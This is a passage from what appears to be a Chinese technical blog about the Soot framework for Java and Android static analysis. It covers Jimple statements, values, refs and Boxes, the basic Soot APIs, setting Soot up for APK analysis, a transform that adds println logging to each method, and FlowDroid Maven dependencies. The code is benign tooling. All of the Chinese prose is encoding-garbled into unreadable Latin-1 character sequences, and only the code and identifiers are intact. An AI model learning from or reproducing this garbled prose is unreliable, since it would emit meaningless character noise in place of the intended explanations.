<li><code>IdentityStmt</code>ï¼šé€šå¸¸æŒ‡çš„æ˜¯å¯¹å˜é‡èµ‹å€¼ï¼Œè¿™ä¸ªå˜é‡æ—¢å¯ä»¥æ˜¯æ˜¾å¼çš„ä¹Ÿå¯ä»¥æ˜¯éšå¼çš„ã€‚</li>
<li>ä¸€ä¸ª<code>IdentityStmt</code>å°†ç‰¹æ®Šå€¼ï¼Œå¦‚å‚æ•°ã€<code>this</code>æˆ–è¢«æ•è·çš„å¼‚å¸¸ï¼Œåˆ†é…ç»™ä¸€ä¸ª<code>Local</code>ã€‚</li>
<li>æ‰€æœ‰æ­£å¸¸çš„èµ‹å€¼ï¼Œä¾‹å¦‚ä»ä¸€ä¸ª<code>Local</code>åˆ°å¦ä¸€ä¸ª<code>Local</code>ï¼Œæˆ–è€…ä»ä¸€ä¸ª<code>Constant</code>åˆ°ä¸€ä¸ª<code>Local</code>ï¼Œéƒ½æ˜¯ç”¨<code>AssignStmt</code>è¡¨ç¤ºçš„ã€‚</li>
</ul>
</li>
<li>è´Ÿè´£è¿‡ç¨‹å†…æ§åˆ¶æµçš„è¯­å¥ï¼š<code>IfStmt</code> ï¼Œ <code>GotoStmt</code> ï¼Œ <code>TableSwitchStmt</code> ï¼Œ <code>LookupSwitchStmt</code>ã€‚</li>
<li>è´Ÿè´£è¿‡ç¨‹é—´çš„æ§åˆ¶æµè¯­å¥ï¼š<code>InvokeStmt</code> ï¼Œ <code>ReturnStmt</code> ï¼Œ <code>ReturnVoidStmt</code>ã€‚</li>
<li>ç›‘æ§è¯­å¥ï¼š<code>EnterMonitorStmt</code> ï¼Œ <code>ExitMonitorStmt</code>ã€‚</li>
<li><code>ThrowStmt</code> ï¼Œ <code>RetStm</code>ã€‚</li>
</ul>
<h3 id="Value"><a href="#Value" class="headerlink" title="Value"></a>Value</h3><ul>
<li><code>Local</code></li>
<li><code>Constant</code></li>
<li><code>Ref</code></li>
<li><code>Expr</code></li>
</ul>
<h4 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h4><p><strong>JimpleLocal</strong>ï¼š<code>local</code>å˜é‡</p>
<p><strong>TemporaryRegisterLocal</strong>ï¼š <code>$</code>å¼€å¤´çš„ä¸´æ—¶å˜é‡</p>
<p><img src="https://fynch3r.github.io/images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210619180333086.png" alt="image-20210619180333086"></p>
<h4 id="Constant"><a href="#Constant" class="headerlink" title="Constant"></a>Constant</h4><p><img src="https://fynch3r.github.io/images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210619182313742.png" alt="image-20210619182313742"></p>
<h4 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h4><p><code>ConcreteRef</code>ï¼š</p>
<ul>
<li><code>ArrayRef</code>ï¼šæŒ‡å‘æ•°ç»„ã€‚</li>
<li><code>FieldRef</code>ï¼š æŒ‡å‘<code>field</code>ã€‚<ul>
<li><code>StaticFieldRef </code>ï¼šé™æ€<code>field</code>çš„å¼•ç”¨ã€‚</li>
<li><code>InstanceFieldRef</code> ï¼šæŒ‡å‘çš„<code>field</code>æ˜¯ä¸€ä¸ªå¯¹è±¡å®ä¾‹ã€‚</li>
</ul>
</li>
</ul>
<p><code>IdentityRef</code>ï¼š</p>
<ul>
<li><code>CaughtExceptionRef </code>ï¼šæŒ‡å‘æ•è·åˆ°çš„å¼‚å¸¸çš„å¼•ç”¨</li>
<li><code>ParameterRef</code>ï¼šå‡½æ•°å‚æ•°çš„å¼•ç”¨</li>
<li><code>ThisRef</code> ï¼š<code>this</code>çš„å¼•ç”¨</li>
</ul>
<p><img src="https://fynch3r.github.io/images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210619194142262.png"></p>
<h4 id="Expr"><a href="#Expr" class="headerlink" title="Expr"></a>Expr</h4><p>ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ª<code>Expr</code>å¯ä»¥å¯¹è‹¥å¹²ä¸ª<code>Value</code>è¿›è¡Œä¸€äº›æ“ä½œå¹¶ä¸”è¿”å›å¦ä¸€ä¸ª<code>Value</code>ã€‚åœ¨<code>Jimple</code>ä¸­ï¼Œå¼ºåˆ¶è¦æ±‚æ‰€æœ‰çš„<code>Value</code><strong>æœ€å¤šåŒ…å«ä¸€ä¸ªè¡¨è¾¾å¼</strong>ã€‚</p>
<p><strong><code>Stmt</code>å’Œ<code>Expr</code>çš„åŒºåˆ«</strong>ï¼š<code>Stmt</code>æ²¡æœ‰è¿”å›å€¼ï¼Œ<code>Expr</code>æœ‰è¿”å›å€¼ã€‚</p>
<h3 id="Box"><a href="#Box" class="headerlink" title="Box"></a>Box</h3><p><code>Box</code>æ˜¯æŒ‡é’ˆï¼Œæä¾›äº†å¯¹<code>Soot</code>å¯¹è±¡çš„é—´æ¥è®¿é—®ã€‚<strong>ä¸€ä¸ª<code>Box</code>æä¾›äº†ä¸€ä¸ªé—´æ¥è®¿é—®<code>soot(Unit,Value)</code>çš„å…¥å£</strong>ï¼Œç±»ä¼¼äº<code>Java</code>çš„ä¸€ä¸ªå¼•ç”¨ã€‚å½“<code>Unit</code>åŒ…å«å¦ä¸€ä¸ª<code>Unit</code>çš„æ—¶å€™ï¼Œéœ€è¦é€šè¿‡<code>Box</code>æ¥è®¿é—®ï¼Œ<code>Soot</code> é‡Œæä¾›äº†ä¸¤ç§ç±»å‹çš„<code>Box</code>, ä¸€ä¸ªæ˜¯<code>ValueBox</code>ä¸€ä¸ªæ˜¯<code>UnitBox</code>ã€‚</p>
<ul>
<li><code>ValueBox</code>ï¼ŒæŒ‡å‘<code>Values</code>ï¼š<ul>
<li>å¯¹äºä¸€æ¡<code>Unit</code>æ¥è¯´ï¼Œä»–çš„<code>ValueBox</code>å­˜å‚¨çš„æ˜¯åœ¨è¿™æ¡è¯­å¥å†…éƒ¨æ‰€<strong>ç”¨åˆ°</strong>çš„å’Œ<strong>æ‰€å®šä¹‰</strong>çš„è¯­å¥ã€‚</li>
</ul>
</li>
<li><code>UnitBox</code>ï¼ŒæŒ‡å‘<code>Units</code>ï¼š<ul>
<li>ä»¥<code>goto</code>è¯­å¥ä¸ºä¾‹ï¼Œ<code>UnitBox</code>å…¶å®å­˜çš„å°±æ˜¯<code>goto</code>æ‰€æŒ‡çš„ä¸‹ä¸€è·³èŠ‚ç‚¹ã€‚</li>
<li><code>switch</code>è¯­å¥ï¼Œåˆ™ä¼šåŒ…å«å¾ˆå¤š<code>boxes</code>ã€‚</li>
</ul>
</li>
</ul>
<p>è¿˜éœ€è¦çŸ¥é“ä»¥ä¸‹çš„è§„åˆ™ï¼š</p>
<ul>
<li>**ä¸€ä¸ª<code>Unit</code>å¯ä»¥æœ‰å¤šä¸ª<code>UnitBox</code>ï¼Œä½†æ˜¯æ¯ä¸ª<code>UnitBox</code>åªèƒ½æŒ‡å‘ä¸€ä¸ª<code>Unit</code>**ã€‚<code>GotoStmt</code> éœ€è¦çŸ¥é“ç›®æ ‡çš„<code>Unit</code>æ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥ä¸€ä¸ª<code>Unit</code>ä¼šåŒ…å«å…¶å®ƒçš„<code>UnitBox</code>ï¼Œé€šè¿‡ <code>UnitBox</code>è·å–ä¸‹ä¸€ä¸ª<code>Unit</code>ã€‚</li>
<li>**ä¸€ä¸ª<code>Value</code>å¯ä»¥å¯¹åº”å¤šä¸ª<code>ValueBox</code>ï¼Œä½†æ˜¯ä¸€ä¸ª<code>ValueBox</code>åªèƒ½å¯¹åº”ä¸€ä¸ª<code>Value</code>**ï¼Œå¯¹äºä¸€ä¸ª<code>Unit</code>ï¼Œå¯ä»¥å¾—åˆ°å¾ˆå¤šä¸ª<code>ValueBox</code>ï¼ŒåŒ…å«ç€è¿™æ¡è¯­å¥å†…éƒ¨çš„æ‰€ç”¨åˆ°å’Œæ‰€å®šä¹‰çš„è¯­å¥ã€‚</li>
</ul>
<p><img src="https://fynch3r.github.io/images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325104642746.png" alt="image-20210325104642746"></p>
<h2 id="åŸºæœ¬API"><a href="#åŸºæœ¬API" class="headerlink" title="åŸºæœ¬API"></a>åŸºæœ¬API</h2><p><img src="https://miro.medium.com/max/700/1*yIuXcna6Ag7-Par4YgmBnw.png"></p>
<h3 id="SootClass"><a href="#SootClass" class="headerlink" title="SootClass"></a>SootClass</h3><p>è·å–ä¸€ä¸ªç±»çš„ä¿¡æ¯ï¼Œå¦‚æœç±»æ˜¯åœ¨ä¸€ä¸ªåŒ…é‡Œï¼Œåˆ™åº”è¯¥åŒ…å«å®Œæ•´çš„åŒ…åï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">circleClass = Scene.v().getSootClass(<span class="string">&quot;Circle&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœåˆ†æçš„ç±»ä¸åœ¨<code>Scene</code>ä¸­ï¼Œåˆ™<code>getSootClass</code>å°†è¿”å›ä¸€ä¸ª<code>Phantom</code>ç±»æˆ–è€…æ˜¯å¼‚å¸¸ã€‚<code>Phantom</code>ç±»ä¸å½±å“åˆ†æçš„è¿›è¡Œï¼Œè¿™åœ¨ä¸å…³æ³¨å…¶ä»–æ¨¡å—çš„ä»£ç æ—¶å¾ˆæœ‰ç”¨ã€‚å¦‚æœè¦ç¡®ä¿æŸ¥è¯¢çš„ç±»å­˜åœ¨ï¼Œå¯ä»¥é€šè¿‡<code>getSootClassUnsafe(className, false)</code>ï¼ˆå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™ç»“æœä¸ºç©ºï¼‰æ£€ç´¢å®ƒæˆ–è€…ä½¿ç”¨<code>circleClass.isPhantom()</code>åˆ¤æ–­å®ƒæ˜¯ä¸æ˜¯ä¸º<code>Phantom</code>ç±»ã€‚</p>
<h3 id="SootField"><a href="#SootField" class="headerlink" title="SootField"></a>SootField</h3><p>ç±»ä¸­åŒ…å«å­—æ®µå’Œæ–¹æ³•ï¼Œé€šè¿‡åç§°å’Œç±»å‹æ¥æŸ¥æ‰¾å®ƒä»¬ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SootField</span> <span class="variable">radiusField</span> <span class="operator">=</span> circleClass.getField(<span class="string">&quot;radius&quot;</span>, IntType.v())</span><br></pre></td></tr></table></figure>

<h3 id="SootMethod"><a href="#SootMethod" class="headerlink" title="SootMethod"></a>SootMethod</h3><img src="https://miro.medium.com/max/1400/1*ESTs9adMHZn7oHPWJo5e8w.png" style="zoom:67%;" />

<p>ä¸€èˆ¬æƒ…å†µä¸‹ä½¿ç”¨<code>getMethodByName</code>å³å¯ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">circleClass.getMethodByName(<span class="string">&quot;getCircleCount&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¯¹äºæ–¹æ³•é‡è½½ï¼Œéœ€è¦ä½¿ç”¨<code>getMethod</code>æ–¹æ³•ï¼Œå¹¶æä¾›<code>Subsignature</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">circleClass.getMethod(<span class="string">&quot;int area(boolean)&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Modifier"><a href="#Modifier" class="headerlink" title="Modifier"></a>Modifier</h3><p>ç±»ã€æ–¹æ³•å’Œå­—æ®µçš„è®¿é—®æ¨¡å¼ï¼š<code>pulic</code>ã€<code>priavet</code>ã€<code>protected</code>ã€<code>final</code>ã€<code>abstract</code>ç­‰ã€‚è¿™äº›ä¿¡æ¯ä¿å­˜åœ¨<code>Modifier</code>ä¸­ï¼Œæ¯”å¦‚ï¼ŒæŸ¥è¯¢ä¸€ä¸ªæ–¹æ³•æ˜¯å¦ä¸ºé™æ€çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Modifier.isStatic(method.getModfiers())</span><br></pre></td></tr></table></figure>

<h3 id="Body"><a href="#Body" class="headerlink" title="Body"></a>Body</h3><p>åœ¨<code>Body</code>ä¸­æœ‰<code>Units</code>ï¼Œ<code>Values</code>ï¼Œ<code>Traps</code>ã€‚</p>
<h3 id="ä¿®æ”¹ä»£ç "><a href="#ä¿®æ”¹ä»£ç " class="headerlink" title="ä¿®æ”¹ä»£ç "></a>ä¿®æ”¹ä»£ç </h3><p><code>Soot</code>å¯ä»¥ä¿®æ”¹æ–¹æ³•çš„<code>Body</code>ã€‚ç„¶åå¯ä»¥ä½¿ç”¨<code>validate</code>æ£€æŸ¥ä¿®æ”¹æ˜¯å¦æ­£ç¡®ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">stmt.apply(<span class="keyword">new</span> <span class="title class_">AbstractStmtSwitch</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">caseIfStmt</span><span class="params">(IfStmt stmt)</span> &#123;</span><br><span class="line">        stmt.setTarget(body.getUnits().getSuccOf(stmt));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">body.validate();</span><br></pre></td></tr></table></figure>

<h2 id="APKåˆ†æ"><a href="#APKåˆ†æ" class="headerlink" title="APKåˆ†æ"></a>APKåˆ†æ</h2><p>é¦–å…ˆï¼Œ<code>soot</code>ä½¿ç”¨<a target="_blank" rel="noopener" href="https://www.abartel.net/dexpler/"><em>Dexpler</em></a> å°† <code>Dalvik</code> å­—èŠ‚ç è½¬æ¢ä¸º <code>Jimple Body</code>ã€‚ç„¶åå¯ä»¥å¯¹æ•´ä¸ªç¨‹åºè¿›è¡Œè½¬æ¢ã€ä¼˜åŒ–å’Œæ³¨é‡Šã€‚æ¥ä¸‹æ¥ï¼Œ <code>Jimple</code> è½¬æ¢åŒ…å°†åœ¨æ¯ä¸ª <code>Jimple Body</code>ä¸Šè¿è¡Œã€‚æœ€åï¼Œ<code>Soot</code> å°†æ‰€æœ‰ <code>Jimple Body</code>è½¬æ¢ä¸º <code>Baf</code>ï¼ˆ<code>Soot</code> ä¸­çš„ä½çº§ä¸­é—´è¡¨ç¤ºï¼‰ï¼Œå¹¶ä½¿ç”¨ <code>Dexpler</code> å°†æ•´ä¸ªä»£ç ç¼–è¯‘æˆ <code>APK</code>ã€‚</p>
<p><img src="https://miro.medium.com/max/1400/1*2E96Cu2BrZhrO74MxHCbTA.png" alt="img"></p>
<ul>
<li><code>jtp</code>ï¼Œ<code>jimple</code>è½¬æ¢åŒ…ã€‚</li>
<li><code>jop</code>ï¼Œ<code>jimple</code>ä¼˜åŒ–åŒ…ã€‚</li>
<li><code>jap</code>ï¼Œ<code>jimple</code>æ³¨é‡ŠåŒ…ã€‚</li>
</ul>
<p>å…³äºåŒ…çš„å…·ä½“ä¿¡æ¯å¯ä»¥çœ‹<a target="_blank" rel="noopener" href="https://github.com/soot-oss/soot/wiki/Packs-and-phases-in-Soot">è¿™é‡Œ</a>ã€‚</p>
<h3 id="Sootè®¾ç½®"><a href="#Sootè®¾ç½®" class="headerlink" title="Sootè®¾ç½®"></a>Sootè®¾ç½®</h3><p>å…³äº<code>Option</code>çš„è¯¦ç»†ä¿¡æ¯åœ¨<a target="_blank" rel="noopener" href="https://soot-oss.github.io/soot/docs/">è¿™é‡Œ</a>ã€‚</p>
<p>åˆ†æ<code>APK</code>ä¹‹å‰ï¼Œ<code>Soot</code>è¿˜éœ€è¦è¿›è¡Œä¸€äº›è®¾ç½®ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setupSoot</span><span class="params">(String androidJar, String apkPath, String outputPath)</span> &#123;</span><br><span class="line">    <span class="comment">// Reset the Soot settings (it&#x27;s necessary if you are analyzing several APKs)</span></span><br><span class="line">    G.reset();</span><br><span class="line">    <span class="comment">// Generic options</span></span><br><span class="line">    Options.v().set_allow_phantom_refs(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_whole_program(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_prepend_classpath(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// Read (APK Dex-to-Jimple) Options</span></span><br><span class="line">    Options.v().set_android_jars(androidJar); <span class="comment">// The path to Android Platforms</span></span><br><span class="line">    Options.v().set_src_prec(Options.src_prec_apk); <span class="comment">// Determine the input is an APK</span></span><br><span class="line">    Options.v().set_process_dir(Collections.singletonList(apkPath)); <span class="comment">// Provide paths to the APK</span></span><br><span class="line">    Options.v().set_process_multiple_dex(<span class="literal">true</span>);  <span class="comment">// Inform Dexpler that the APK may have more than one .dex files</span></span><br><span class="line">    Options.v().set_include_all(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// Write (APK Generation) Options</span></span><br><span class="line">    Options.v().set_output_format(Options.output_format_dex);</span><br><span class="line">    Options.v().set_output_dir(outputPath);</span><br><span class="line">    Options.v().set_validate(<span class="literal">true</span>); <span class="comment">// Validate Jimple bodies in each transofrmation pack</span></span><br><span class="line">    <span class="comment">// Resolve required classes </span></span><br><span class="line">    Scene.v().addBasicClass(<span class="string">&quot;java.io.PrintStream&quot;</span>,SootClass.SIGNATURES);</span><br><span class="line">    Scene.v().addBasicClass(<span class="string">&quot;java.lang.System&quot;</span>,SootClass.SIGNATURES);</span><br><span class="line">    Scene.v().loadNecessaryClasses();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ¡ˆä¾‹ä¸€-æ’å…¥æŒ‡ä»¤"><a href="#æ¡ˆä¾‹ä¸€-æ’å…¥æŒ‡ä»¤" class="headerlink" title="æ¡ˆä¾‹ä¸€ æ’å…¥æŒ‡ä»¤"></a>æ¡ˆä¾‹ä¸€ æ’å…¥æŒ‡ä»¤</h3><p>åœ¨æ¯ä¸ªæ–¹æ³•ä¸­åŠ å…¥æ—¥å¿—è¾“å‡ºï¼š<code>System.out.println(&quot;Beginning of method: &quot; + METHOD_NAME)</code>ã€‚<code>jimple</code>ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$r1 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">virtualinvoke $r1.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;&lt;SOOT_TUTORIAL&gt; Beginning of method METHOD_NAME&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Bodyè½¬æ¢ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PackManager.v().getPack(<span class="string">&quot;jtp&quot;</span>).add(<span class="keyword">new</span> <span class="title class_">Transform</span>(<span class="string">&quot;jtp.myLogger&quot;</span>, <span class="keyword">new</span> <span class="title class_">BodyTransformer</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">internalTransform</span><span class="params">(Body b, String phaseName, Map&lt;String, String&gt; options)</span> &#123;</span><br><span class="line">        <span class="comment">// First we filter out Android framework methods</span></span><br><span class="line">        <span class="keyword">if</span>(InstrumentUtil.isAndroidMethod(b.getMethod()))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">JimpleBody</span> <span class="variable">body</span> <span class="operator">=</span> (JimpleBody) b;</span><br><span class="line">        <span class="type">UnitPatchingChain</span> <span class="variable">units</span> <span class="operator">=</span> b.getUnits();</span><br><span class="line">        List&lt;Unit&gt; generatedUnits = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// The message that we want to log</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s Beginning of method %s&quot;</span>, InstrumentUtil.TAG, body.getMethod().getSignature());</span><br><span class="line">        <span class="comment">// In order to call &quot;System.out.println&quot; we need to create a local containing &quot;System.out&quot; value</span></span><br><span class="line">        <span class="type">Local</span> <span class="variable">psLocal</span> <span class="operator">=</span> InstrumentUtil.generateNewLocal(body, RefType.v(<span class="string">&quot;java.io.PrintStream&quot;</span>));</span><br><span class="line">        <span class="comment">// Now we assign &quot;System.out&quot; to psLocal</span></span><br><span class="line">        <span class="type">SootField</span> <span class="variable">sysOutField</span> <span class="operator">=</span> Scene.v().getField(<span class="string">&quot;&lt;java.lang.System: java.io.PrintStream out&gt;&quot;</span>);</span><br><span class="line">        <span class="type">AssignStmt</span> <span class="variable">sysOutAssignStmt</span> <span class="operator">=</span> Jimple.v().newAssignStmt(psLocal, Jimple.v().newStaticFieldRef(sysOutField.makeRef()));</span><br><span class="line">        generatedUnits.add(sysOutAssignStmt);</span><br><span class="line">        <span class="comment">// Create println method call and provide its parameter</span></span><br><span class="line">        <span class="type">SootMethod</span> <span class="variable">printlnMethod</span> <span class="operator">=</span> Scene.v().grabMethod(<span class="string">&quot;&lt;java.io.PrintStream: void println(java.lang.String)&gt;&quot;</span>);</span><br><span class="line">        <span class="type">Value</span> <span class="variable">printlnParamter</span> <span class="operator">=</span> StringConstant.v(content);</span><br><span class="line">        <span class="type">InvokeStmt</span> <span class="variable">printlnMethodCallStmt</span> <span class="operator">=</span> Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(psLocal, printlnMethod.makeRef(), printlnParamter));</span><br><span class="line">        generatedUnits.add(printlnMethodCallStmt);</span><br><span class="line">        <span class="comment">// Insert the generated statement before the first  non-identity stmt</span></span><br><span class="line">        units.insertBefore(generatedUnits, body.getFirstNonIdentityStmt());</span><br><span class="line">        <span class="comment">// Validate the body to ensure that our code injection does not introduce any problem (at least statically)</span></span><br><span class="line">        b.validate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>

<h3 id="æ¡ˆä¾‹äºŒ-FlowDroid"><a href="#æ¡ˆä¾‹äºŒ-FlowDroid" class="headerlink" title="æ¡ˆä¾‹äºŒ FlowDroid"></a>æ¡ˆä¾‹äºŒ FlowDroid</h3><p><code>FlowDroid</code> æ˜¯ä¸€æ¬¾ç”¨äº <code>Android</code> åº”ç”¨ç¨‹åºå’Œ <code>Java</code> ç¨‹åºçš„æ•°æ®æµåˆ†æåŠŸèƒ½ï¼Œé¡¹ç›®<a target="_blank" rel="noopener" href="https://github.com/secure-software-engineering/FlowDroid">åœ°å€</a>ã€‚</p>
<p>å¦‚æœæ˜¯ä½¿ç”¨ Mavenï¼Œç¼–è¾‘ <code>pom.xml</code>å³å¯ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.fraunhofer.sit.sse.flowdroid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>soot-infoflow<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.fraunhofer.sit.sse.flowdroid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>soot-infoflow-summaries<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.fraunhofer.sit.sse.flowdroid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>soot-infoflow-android<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœåªä½¿ç”¨å‘½ä»¤è¡Œï¼Œåˆ™åœ¨<a target="_blank" rel="noopener" href="https://github.com/secure-software-engineering/FlowDroid/releases">Relase</a>é‡Œä¸‹è½½<code>soot-infoflow-cmd-jar-with-dependencies.jar</code>å³å¯ã€‚</p>
<p>å¦‚æœä¸ä½¿ç”¨<code>pom.xml</code>ï¼Œä½¿ç”¨<code>jar</code>åŒ…çš„æ–¹å¼ï¼Œéœ€è¦å»<a target="_blank" rel="noopener" href="https://github.com/secure-software-engineering/FlowDroid/releases">Relase</a>ä¸‹è½½<code>soot-infoflow-android-classes.jar</code>å’Œ<code>soot-infoflow-classes.jar</code>ï¼Œå†å»Sootçš„<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=HzjYkP/HgkU1xzcZFUAgbQ==.ZT99lh7G5tR1RbjbWKkx7vAVeM5bMFQD///krUVFH6eMiI2TYxlBEYANDSAUtdFnviP1SJ4LWKbgY7RcZgTVjpwh0hB/sixiDALazZB/8Gw=">ä»“åº“</a>ä¸‹è½½åŒ…å«<code>heros</code>ä¸<code>jasmin</code>çš„<code>sootclasses-trunk-jar-with-dependencies.jar</code>ï¼Œå°†ä¸Šè¿°ä¸‰ä¸ªåŒ…åŠ å…¥é¡¹ç›®ä¾èµ–ä¾¿å®Œæˆäº†<code>FlowDroid</code>çš„é…ç½®ã€‚</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-05-16T12:18:54.000Z" title="2022/5/16 20:18:54">2022-05-16</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-21T14:22:16.615Z" title="2022/5/21 22:22:16">2022-05-21</time></span><span class="level-item">16 minutes read (About 2396 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/05/16/Android%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/">Androidé™æ€åˆ†æå·¥å…·å¼€å‘ç¬”è®°</a></p><div class="content"><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‡†å¤‡å†™ä¸€æ¬¾<code>Apk</code>çš„é™æ€æ‰«æå·¥å…·ï¼Œç»“åˆ<code>FlowDroid</code>ï¼ˆåº•å±‚é‡‡ç”¨<code>soot</code>ï¼‰ã€<code>Jandroid</code>ã€‚åé¢ä¼šå†å‚è€ƒä¸€ä¸‹å…¶ä»–çš„é™æ€åˆ†æå·¥å…·ï¼Œå¦‚ 